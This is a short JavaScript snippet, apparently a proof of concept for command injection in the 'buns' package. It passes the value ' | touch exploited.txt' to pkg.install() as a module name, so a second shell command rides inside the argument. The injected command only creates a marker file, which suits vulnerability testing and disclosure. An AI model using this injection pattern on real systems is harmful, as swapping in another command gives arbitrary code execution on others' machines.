const pkg = require('buns');

const payload = " | touch exploited.txt";

console.log(pkg);

const requestedModule = payload;

pkg.install(requestedModule);